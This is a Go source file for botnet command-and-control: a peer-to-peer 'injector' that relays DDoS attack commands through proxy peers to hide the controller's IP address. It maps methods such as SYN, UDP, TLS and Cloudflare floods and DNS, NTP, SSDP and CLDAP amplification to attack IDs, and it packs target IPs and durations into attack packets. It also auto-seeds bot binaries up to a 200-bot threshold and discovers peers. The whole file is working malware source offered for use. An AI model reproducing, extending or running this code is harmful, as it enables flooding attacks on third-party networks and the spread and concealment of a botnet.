package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

/*
 * P2P Injector with Proxy Support
 * Sends attack commands through the P2P network via proxy peers
 * to shield the C&C server's real IP address.
 * Auto-seeds binaries only when bot count < 200.
 */

type P2PInjector struct {
	seeds      []string
	proxies    []string
	botCount   int
	isSeeding  bool
}

/* Bot count threshold for seeding control */
const (
	SEED_THRESHOLD    = 200 // Stop seeding when bots >= 200
	SEED_RESUME       = 200 // Resume seeding when bots < 200
)

func NewP2PInjector(seeds string, proxies []string) *P2PInjector {
	seedList := strings.Split(seeds, ",")
	return &P2PInjector{
		seeds:     seedList,
		proxies:   proxies,
		isSeeding: true,
	}
}

/* Update bot count from CNC client list */
func (this *P2PInjector) UpdateBotCount(count int) {
	this.botCount = count

	/* Auto-seed control: stop seeding at 200 bots, resume below 200 */
	if count >= SEED_THRESHOLD && this.isSeeding {
		this.isSeeding = false
		fmt.Printf("[P2P] Bot count %d >= %d, stopping binary seeding\n", count, SEED_THRESHOLD)
	} else if count < SEED_RESUME && !this.isSeeding {
		this.isSeeding = true
		fmt.Printf("[P2P] Bot count %d < %d, resuming binary seeding\n", count, SEED_RESUME)
	}
}

/* Check if we should be seeding binaries */
func (this *P2PInjector) ShouldSeed() bool {
	return this.isSeeding
}

/* Get current bot count */
func (this *P2PInjector) BotCount() int {
	return this.botCount
}

/* Send attack command through P2P network via proxies */
func (this *P2PInjector) SendAttack(attackBuf []byte) error {
	/* Build P2P packet: CMD(1) + TTL(1) + AttackPayload */
	packet := make([]byte, 2+len(attackBuf))
	packet[0] = 0x10 /* P2P_CMD_ATTACK */
	packet[1] = 0    /* TTL starts at 0 */
	copy(packet[2:], attackBuf)

	/* Use proxies if available, otherwise use direct seeds */
	targets := this.seeds
	if len(this.proxies) > 0 {
		targets = this.proxies
	}

	for _, target := range targets {
		addr, err := net.ResolveUDPAddr("udp", target)
		if err != nil {
			continue
		}

		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			continue
		}

		conn.Write(packet)
		conn.Close()
	}

	return nil
}

/* Send binary seeding request through P2P network */
func (this *P2PInjector) SendBinarySeed(binaryName string) error {
	if !this.isSeeding {
		return nil /* Not seeding */
	}

	/* Build file request for the binary */
	/* This tells peers to start serving this binary */
	packet := make([]byte, 36)
	packet[0] = 0x20 /* P2PFILE_REQ */
	packet[1] = 0    /* Chunk 0 */
	packet[2] = 0
	copy(packet[3:], binaryName)

	targets := this.seeds
	if len(this.proxies) > 0 {
		targets = this.proxies
	}

	for _, target := range targets {
		addr, err := net.ResolveUDPAddr("udp", target)
		if err != nil {
			continue
		}

		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			continue
		}

		conn.Write(packet)
		conn.Close()
	}

	return nil
}

/* Parse attack command and send through P2P */
func (this *P2PInjector) ParseAndSend(cmd string) error {
	parts := strings.Fields(cmd)
	if len(parts) < 3 {
		return fmt.Errorf("invalid command")
	}

	method := parts[0]
	target := parts[1]
	duration, _ := strconv.Atoi(parts[2])

	var attackID uint8
	switch method {
	case "udp":
		attackID = 0
	case "vse":
		attackID = 1
	case "fivem":
		attackID = 2
	case "discord":
		attackID = 30
	case "pps":
		attackID = 3
	case "tls":
		attackID = 4
	case "tlsplus":
		attackID = 5
	case "cf":
		attackID = 6
	case "axis-l7", "l7":
		attackID = 7
	case "dns-amp":
		attackID = 8
	case "ntp-amp":
		attackID = 9
	case "ssdp-amp":
		attackID = 10
	case "snmp-amp":
		attackID = 11
	case "cldap-amp":
		attackID = 12
	case "syn":
		attackID = 13
	case "ack":
		attackID = 14
	case "fin":
		attackID = 15
	case "rst":
		attackID = 16
	case "tcpconn":
		attackID = 17
	case "xmas":
		attackID = 18
	case "null":
		attackID = 19
	case "window":
		attackID = 20
	case "icmp":
		attackID = 21
	case "greip":
		attackID = 22
	case "greeth":
		attackID = 23
	default:
		return fmt.Errorf("unknown method: %s", method)
	}

	/* Build attack payload */
	buf := make([]byte, 14)
	buf[0] = attackID
	buf[1] = 1

	// Parse target
	var targetIP net.IP
	if strings.Contains(target, "://") {
		targetIP = net.ParseIP(extractIPFromURL(target))
	} else {
		targetIP = net.ParseIP(target)
	}
	if targetIP == nil || targetIP.To4() == nil {
		targetIP = net.ParseIP("1.1.1.1")
	}
	copy(buf[2:6], targetIP.To4())
	buf[6] = 32
	buf[7] = 0

	durBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(durBuf, uint32(duration))
	copy(buf[10:14], durBuf)

	return this.SendAttack(buf)
}

/* Auto-discover peers like torrent DHT */
func (this *P2PInjector) DiscoverPeers() []string {
	/* Send PING to seeds and collect PONG responses */
	/* This mimics torrent DHT peer discovery */
	discovered := make([]string, 0)

	for _, seed := range this.seeds {
		addr, err := net.ResolveUDPAddr("udp", seed)
		if err != nil {
			continue
		}

		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			continue
		}

		/* Send PING */
		ping := []byte{0x01, 0x00}
		conn.Write(ping)

		/* Wait for PONG response */
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		buf := make([]byte, 1024)
		n, _, err := conn.ReadFromUDP(buf)
		if err != nil {
			conn.Close()
			continue
		}

		if n >= 3 && buf[0] == 0x02 { /* P2P_CMD_PONG */
			peerCount := int(buf[2])
			for i := 0; i < peerCount && (3+i*6) < n; i++ {
				peerIP := net.IP(buf[3+i*6 : 3+i*6+4])
				peerPort := binary.BigEndian.Uint16(buf[3+i*6+4 : 3+i*6+6])
				discovered = append(discovered, fmt.Sprintf("%s:%d", peerIP.String(), peerPort))
			}
		}

		conn.Close()
	}

	return discovered
}

func extractIPFromURL(url string) string {
	if strings.HasPrefix(url, "http://") {
		url = url[7:]
	} else if strings.HasPrefix(url, "https://") {
		url = url[8:]
	}
	if idx := strings.Index(url, "/"); idx != -1 {
		url = url[:idx]
	}
	if idx := strings.Index(url, ":"); idx != -1 {
		url = url[:idx]
	}
	return url
}
